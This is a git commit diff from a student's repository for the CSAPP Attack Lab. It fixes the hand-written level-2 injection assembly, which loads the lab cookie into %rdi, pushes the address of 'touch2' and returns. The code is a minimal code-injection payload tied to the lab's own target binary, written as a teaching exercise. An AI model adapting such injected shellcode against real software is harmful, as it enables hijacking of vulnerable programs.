03d2dd439aad407dab8ff3a0480a882d35d799d1
Tom <wuyangzerg@gmail.com>
2026-03-17 17:19:32 +1300

    udpate exploit code of the level 2 of the part 1 of the attack lab

--- CSAPP/labs/labs_of_CSAPP3e/3_Attack_Lab/protected_dir/target1/part_1/assem_lv2.s
+++ CSAPP/labs/labs_of_CSAPP3e/3_Attack_Lab/protected_dir/target1/part_1/assem_lv2.s
@@ -1,5 +1,5 @@
 # Hand-generated assembly for the level 2.
-movq  0x59b997fa, %rdi  # Pass my cookie in %rdi
-pushq 0x4017ec	# The position of "touch2"
+movq  $0x59b997fa, %rdi		# Pass my cookie in %rdi
+pushq $0x4017ec				# The position of "touch2"
 retq
 
